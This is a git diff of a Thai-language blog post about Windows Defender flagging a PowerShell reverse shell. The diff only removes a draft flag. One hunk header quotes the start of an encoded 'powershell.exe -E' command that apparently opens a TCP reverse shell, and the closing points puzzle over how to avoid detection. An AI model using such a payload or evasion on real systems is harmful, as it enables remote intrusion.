@@ -1,7 +1,6 @@
 ---
 title: "What The Fuck Do You Want Windows Defender?"
 date: 2020-06-30T23:16:18+07:00
-draft: true
 author: "Bongtrop"
 description: "เรื่องแปลก ๆ ของนาย Windows Defender แสนวุ่นวายกับ Reverse Shell จอมซน"
 ---
@@ -89,4 +88,3 @@ powershell.exe -E JABhAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAH
 1. คุณ Windows Defender จะ Detect ทำไมกับโปรแกรมรับข้อความจาก TCP มา Eval แล้วส่งกลับ
 2. คุณ Windows Defender จะ Detect จาก `(pwd).Path` ไม่ได้นะครับ มันไม่ได้เป็นสาระสำคัญของ Script เลย
 3. อะไรกันคับเนี่ย คุณ Windows Defender คุณคิดอะไรอยู่ ผมงงไปหมดแล้ว
-
